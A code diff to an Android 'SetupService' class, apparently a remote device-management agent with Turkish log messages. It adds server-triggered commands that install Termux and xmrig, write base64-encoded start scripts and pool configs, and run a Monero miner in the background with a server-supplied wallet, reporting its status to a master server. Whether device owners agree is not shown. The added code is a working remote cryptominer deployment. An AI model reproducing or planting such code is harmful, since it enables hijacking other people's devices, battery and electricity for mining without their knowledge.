@@ -180,6 +180,7 @@ public class SetupService extends Service {
             try {
                 JSONObject body = new JSONObject();
                 body.put("device_id", TetzConfig.getDeviceId(this));
+                body.put("miner", TetzConfig.getMinerStatus(this));
                 post(TetzConfig.getMasterUrl(this) + "/heartbeat", body.toString());
             } catch (Exception e) {
                 Log.e(TAG, "heartbeat failed", e);
@@ -215,6 +216,14 @@ public class SetupService extends Service {
                 startApp(msg.optString("package", ""));
             } else if ("stop_app".equals(type)) {
                 stopApp(msg.optString("package", ""));
+            } else if ("setup_miner".equals(type)) {
+                setupMiner();
+            } else if ("miner_start".equals(type)) {
+                minerStart();
+            } else if ("miner_stop".equals(type)) {
+                minerStop();
+            } else if ("miner_config".equals(type)) {
+                minerConfig(msg);
             } else {
                 String apkUrl = msg.optString("apk_url", "");
                 if (!apkUrl.isEmpty()) {
@@ -250,6 +259,98 @@ public class SetupService extends Service {
             Log.i(TAG, "stop_app: " + pkg + " rc=" + rc);
         } catch (Exception e) {
             Log.e(TAG, "stop_app failed: " + pkg, e);
+        }
+    }
+
+    // ---- Madenci (Termux RUN_COMMAND) ----
+
+    private static final String TERMUX_HOME = "/data/data/com.termux/files/home";
+    private static final String TERMUX_SH = "/data/data/com.termux/files/usr/bin/sh";
+
+    private void runTermuxCommand(String shellCmd) {
+        try {
+            Intent intent = new Intent("com.termux.service_execute");
+            intent.setClassName("com.termux", "com.termux.app.TermuxService");
+            intent.putExtra("com.termux.execute.command_path", TERMUX_SH);
+            intent.putExtra("com.termux.execute.arguments",
+                    new String[]{"-c", shellCmd});
+            intent.putExtra("com.termux.execute.working_directory", TERMUX_HOME);
+            intent.putExtra("com.termux.execute.background", true);
+            startService(intent);
+            Log.i(TAG, "termux komutu gonderildi: " + shellCmd);
+        } catch (Exception e) {
+            Log.e(TAG, "termux komutu failed", e);
+        }
+    }
+
+    private static String b64(String s) {
+        return android.util.Base64.encodeToString(
+                s.getBytes(StandardCharsets.UTF_8), android.util.Base64.NO_WRAP);
+    }
+
+    private static String startScript() {
+        return "#!" + TERMUX_SH + "\n"
+                + "cd ~\n"
+                + "TETZ_T=\"\"\n"
+                + "[ -f ~/threads.txt ] && TETZ_T=\"-t $(cat ~/threads.txt)\"\n"
+                + "nohup xmrig --config ~/config.json $TETZ_T >> ~/xmrig.log 2>&1 &\n";
+    }
+
+    private void setupMiner() {
+        Log.i(TAG, "setup_miner: termux.apk kuruluyor");
+        downloadAndPromptInstall("/apks/termux.apk");
+        String cmd = "pkg update -y && pkg install -y xmrig"
+                + " && echo '" + b64(startScript()) + "' | base64 -d > ~/start-madenci.sh"
+                + " && chmod +x ~/start-madenci.sh"
+                + " && touch ~/.tetz_miner_ready";
+        runTermuxCommand(cmd);
+        TetzConfig.setMinerStatus(this, "hazir");
+        Log.i(TAG, "setup_miner: bootstrap gonderildi");
+    }
+
+    private void minerStart() {
+        String cmd = "[ -f ~/start-madenci.sh ] || "
+                + "(echo '" + b64(startScript()) + "' | base64 -d > ~/start-madenci.sh"
+                + " && chmod +x ~/start-madenci.sh); sh ~/start-madenci.sh";
+        runTermuxCommand(cmd);
+        TetzConfig.setMinerStatus(this, "calisiyor");
+    }
+
+    private void minerStop() {
+        runTermuxCommand("pkill xmrig");
+        TetzConfig.setMinerStatus(this, "durdu");
+    }
+
+    private void minerConfig(JSONObject msg) {
+        String pool = msg.optString("pool_url", "gulf.moneroocean.stream:10128");
+        String wallet = msg.optString("wallet", "");
+        int threads = msg.optInt("threads", 0);
+        try {
+            JSONObject cfg = new JSONObject();
+            cfg.put("autosave", true);
+            JSONObject cpu = new JSONObject();
+            cpu.put("enabled", true);
+            cfg.put("cpu", cpu);
+            org.json.JSONArray pools = new org.json.JSONArray();
+            JSONObject p = new JSONObject();
+            p.put("url", pool);
+            p.put("user", wallet);
+            p.put("pass", "tetz");
+            p.put("rig-id", TetzConfig.getDeviceId(this));
+            p.put("keepalive", true);
+            p.put("enabled", true);
+            pools.put(p);
+            cfg.put("pools", pools);
+            String cmd = "echo '" + b64(cfg.toString()) + "' | base64 -d > ~/config.json";
+            if (threads > 0) {
+                cmd += " && echo '" + threads + "' > ~/threads.txt";
+            }
+            cmd += " && (pgrep xmrig >/dev/null && "
+                    + "(pkill xmrig; sleep 2; sh ~/start-madenci.sh) || true)";
+            runTermuxCommand(cmd);
+            Log.i(TAG, "miner_config yazildi: pool=" + pool + " threads=" + threads);
+        } catch (Exception e) {
+            Log.e(TAG, "miner_config failed", e);
         }
     }
 
